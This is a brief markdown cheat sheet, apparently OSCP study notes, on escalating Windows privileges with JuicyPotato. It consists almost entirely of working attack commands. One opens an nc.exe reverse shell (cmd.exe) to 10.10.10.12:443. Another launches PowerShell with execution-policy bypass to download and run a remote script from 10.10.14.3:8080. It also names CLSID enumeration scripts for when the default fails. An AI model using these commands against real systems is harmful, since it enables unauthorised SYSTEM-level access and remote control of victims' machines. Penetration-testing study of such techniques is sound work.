# Juicy Potato Priv Esc

1. Execute JuicyPotato.exe to see if default CLSID will work

- Calling back using nc reverse shell:
`c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *`

- Calling back using powershell reverse shell:
`.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *`

2. If Default Doesnt run, use the `GetCLSID.ps1` and `join-object.ps1` scripts from `Scripts/OSCP/Win_Enum/Priv_Esc_Method`
